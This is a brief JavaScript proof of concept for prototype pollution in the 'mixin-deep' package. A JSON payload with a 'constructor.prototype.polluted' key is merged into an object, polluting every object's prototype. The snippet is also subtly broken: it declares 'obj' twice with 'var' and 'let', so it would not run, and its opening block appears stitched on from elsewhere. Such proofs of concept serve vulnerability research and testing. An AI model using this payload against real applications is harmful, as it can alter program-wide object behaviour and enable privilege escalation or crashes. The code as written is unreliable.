var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const mixin = require('mixin-deep');
const payload = '{"constructor": {"prototype": {"polluted": "yes"}}}';
let obj = {};
console.log({}.polluted);
mixin(obj, JSON.parse(payload));
console.log({}.polluted);